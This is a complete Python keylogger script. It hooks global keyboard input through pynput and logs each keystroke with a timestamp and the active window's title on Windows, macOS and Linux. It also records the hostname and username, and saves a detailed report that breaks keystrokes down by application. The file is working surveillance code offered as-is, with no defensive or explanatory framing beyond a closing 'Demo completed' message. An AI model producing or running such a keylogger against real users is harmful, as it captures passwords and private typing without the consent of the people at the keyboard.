#!/usr/bin/env python3

import platform
import time
import json
import os
import sys
import subprocess
from datetime import datetime
import threading

PLATFORM = platform.system().lower()

try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

class BasicKeylogger:
    
    def __init__(self, output_file=None):
        self.platform = PLATFORM
        self.captured_data = []
        self.running = False
        self.start_time = None
        self.keystroke_count = 0
        
        if output_file is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.output_file = f"keylog_basic_{timestamp}.txt"
        else:
            self.output_file = output_file
        
        self.system_info = self.get_system_info()
    
    def get_system_info(self):
        info = {
            'platform': platform.platform(),
            'system': platform.system(),
            'release': platform.release(),
            'version': platform.version(),
            'machine': platform.machine(),
            'processor': platform.processor(),
            'hostname': platform.node(),
            'user': os.getenv('USER') or os.getenv('USERNAME') or 'unknown',
            'timestamp': datetime.now().isoformat()
        }
        return info
    
    def get_active_window_info(self):
        try:
            if self.platform == "windows":
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                return buff.value if buff.value else "Desktop"
                
            elif self.platform == "darwin":
                try:
                    script = '''
                    tell application "System Events"
                        set frontApp to name of first application process whose frontmost is true
                        return frontApp
                    end tell
                    '''
                    result = subprocess.run(['osascript', '-e', script], 
                                          capture_output=True, text=True, timeout=2)
                    return result.stdout.strip() if result.stdout else "Terminal"
                except Exception:
                    return "Terminal"
                    
            elif self.platform == "linux":
                try:
                    result = subprocess.run(['xdotool', 'getwindowfocus', 'getwindowname'], 
                                          capture_output=True, text=True, timeout=2)
                    return result.stdout.strip() if result.stdout else "Terminal"
                except Exception:
                    return "Terminal"
            else:
                return "Unknown"
        except Exception:
            return "Unknown"
    
    def format_key(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                return key.char
            else:
                key_name = str(key).replace('Key.', '')
                special_keys = {
                    'space': ' ', 'enter': '\n', 'tab': '\t',
                    'backspace': '[BS]', 'delete': '[DEL]',
                    'shift': '[SHIFT]', 'ctrl': '[CTRL]', 'alt': '[ALT]',
                    'esc': '[ESC]', 'up': '[UP]', 'down': '[DOWN]',
                    'left': '[LEFT]', 'right': '[RIGHT]'
                }
                return special_keys.get(key_name.lower(), f'[{key_name.upper()}]')
        except Exception:
            return '[UNKNOWN]'
    
    def on_key_press(self, key):
        if not self.running:
            return False
            
        try:
            timestamp = time.time()
            readable_time = datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
            
            window_info = self.get_active_window_info()
            formatted_key = self.format_key(key)
            
            log_entry = {
                'timestamp': timestamp,
                'readable_time': readable_time,
                'key': formatted_key,
                'raw_key': str(key),
                'window': window_info,
                'event_type': 'keypress'
            }
            
            self.captured_data.append(log_entry)
            self.keystroke_count += 1
            
            if len(self.captured_data) % 50 == 0:
                self.save_to_file()
                
        except Exception as e:
            pass
    
    def on_key_release(self, key):
        if key == keyboard.Key.esc:
            return False
    
    def save_to_file(self):
        try:
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write("="*80 + "\n")
                f.write("BASIC KEYLOGGER REPORT\n")
                f.write("="*80 + "\n")
                f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Total keystrokes: {len(self.captured_data)}\n")
                
                f.write("\nSYSTEM INFORMATION:\n")
                f.write("-" * 40 + "\n")
                for key, value in self.system_info.items():
                    f.write(f"{key.capitalize()}: {value}\n")
                
                if self.start_time:
                    duration = time.time() - self.start_time
                    f.write(f"\nSESSION INFORMATION:\n")
                    f.write("-" * 40 + "\n")
                    f.write(f"Start time: {datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Duration: {duration:.2f} seconds\n")
                    if duration > 0:
                        f.write(f"Average keystrokes per minute: {(len(self.captured_data) / duration * 60):.2f}\n")
                
                apps = {}
                for entry in self.captured_data:
                    app = entry['window']
                    apps[app] = apps.get(app, 0) + 1
                
                f.write(f"\nAPPLICATION ANALYSIS:\n")
                f.write("-" * 40 + "\n")
                for app, count in sorted(apps.items(), key=lambda x: x[1], reverse=True):
                    percentage = (count / len(self.captured_data)) * 100 if self.captured_data else 0
                    f.write(f"{app}: {count} keystrokes ({percentage:.1f}%)\n")
                
                printable_chars = []
                special_keys = []
                
                for entry in self.captured_data:
                    key = entry['key']
                    if len(key) == 1 and key.isprintable():
                        printable_chars.append(key)
                    else:
                        special_keys.append(key)
                
                f.write(f"\nCHARACTER ANALYSIS:\n")
                f.write("-" * 40 + "\n")
                f.write(f"Printable characters: {len(printable_chars)}\n")
                f.write(f"Special keys: {len(special_keys)}\n")
                
                if printable_chars:
                    char_count = {}
                    for char in printable_chars:
                        char_count[char] = char_count.get(char, 0) + 1
                    
                    f.write(f"\nMost common characters:\n")
                    for char, count in sorted(char_count.items(), key=lambda x: x[1], reverse=True)[:10]:
                        f.write(f"  '{char}': {count} times\n")
                
                f.write(f"\nDETAILED KEYSTROKE LOG:\n")
                f.write("-" * 40 + "\n")
                for entry in self.captured_data:
                    f.write(f"[{entry['readable_time']}] [{entry['window']}] {entry['key']}\n")
                
        except Exception as e:
            pass
    
    def start_logging(self):
        if not PYNPUT_AVAILABLE:
            return False
        
        self.running = True
        self.start_time = time.time()
        
        try:
            with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release,
                suppress=False
            ) as listener:
                listener.join()
                
        except KeyboardInterrupt:
            pass
        except Exception as e:
            return False
        
        self.running = False
        self.save_to_file()
        
        print("Demo completed!")
        print(f"All data saved to: {self.output_file}")
        
        return True

def main():
    keylogger = BasicKeylogger()
    keylogger.start_logging()

if __name__ == "__main__":
    main()